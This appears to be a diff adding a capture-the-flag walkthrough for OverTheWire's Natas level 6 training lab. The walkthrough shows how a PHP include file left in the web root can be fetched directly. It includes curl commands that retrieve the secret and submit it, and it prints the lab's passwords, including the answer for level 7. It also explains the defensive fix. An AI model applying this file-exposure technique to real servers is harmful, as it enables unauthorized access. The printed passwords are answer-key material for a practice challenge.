@@ -1,0 +1,95 @@
+---
+title: "Natas 6"
+description: "Natas Level 6 — a PHP include file is placed inside the web root and accessible directly via HTTP."
+---
+
+## Overview
+
+| Field    | Value                                        |
+|----------|----------------------------------------------|
+| URL      | `http://natas6.natas.labs.overthewire.org`   |
+| Username | `natas6`                                     |
+| Password | `0RoJwHdSKWFTYR5WuiAewauSuNaBXned`          |
+
+The page shows an *"Input secret"* form. Submit the wrong value and it prints *"Wrong secret."* There is a *"View sourcecode"* link — always read the source code when it's offered.
+
+---
+
+## Hints
+
+<AccordionGroup>
+  <Accordion title="Hint 1 — Where does the secret come from?">
+    Read the PHP source via the *"View sourcecode"* link. The script doesn't define `$secret` inline — it loads it from somewhere else using a PHP `include`. What file is being included, and what path is it at?
+  </Accordion>
+  <Accordion title="Hint 2 — Can you access that file directly?">
+    The included file lives at `includes/secret.inc` — a path relative to the web root. PHP processes `.php` files on the server, but `.inc` files may be served as plain text if the server isn't configured to handle them. Try navigating directly to that URL in your browser.
+  </Accordion>
+</AccordionGroup>
+
+---
+
+## Solution
+
+<Accordion title="Full walkthrough">
+  <Steps>
+    <Step title="Read the PHP source">
+      Click *"View sourcecode"*. The relevant part:
+
+      ```php
+      include "includes/secret.inc";
+
+      if(array_key_exists("submit", $_POST)) {
+          if($secret == $_POST['secret']) {
+              print "Access granted. The password for natas7 is <censored>";
+          } else {
+              print "Wrong secret";
+          }
+      }
+      ```
+
+      The secret is loaded from `includes/secret.inc`.
+    </Step>
+    <Step title="Fetch the include file directly">
+      Navigate to:
+
+      ```
+      http://natas6.natas.labs.overthewire.org/includes/secret.inc
+      ```
+
+      The server returns it as plain text:
+
+      ```php
+      <?
+      $secret = "FOEIUWGHFEEUHOFUOIU";
+      ?>
+      ```
+    </Step>
+    <Step title="Submit the secret">
+      Enter `FOEIUWGHFEEUHOFUOIU` in the form and submit.
+    </Step>
+  </Steps>
+</Accordion>
+
+<Note>
+  Include and config files must never be placed inside the web root. Store them above the document root, or configure the web server to deny access to `.inc` files. If PHP can include it, a browser can fetch it.
+</Note>
+
+## With curl
+
+```bash
+# Step 1: retrieve the secret from the exposed include file
+curl -s -u natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned \
+  http://natas6.natas.labs.overthewire.org/includes/secret.inc
+
+# Step 2: POST the secret to the form
+curl -s -u natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned \
+  -X POST -d "secret=FOEIUWGHFEEUHOFUOIU&submit=1" \
+  http://natas6.natas.labs.overthewire.org/ \
+  | grep -i password
+```
+
+## Password
+
+```
+natas7: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
+```
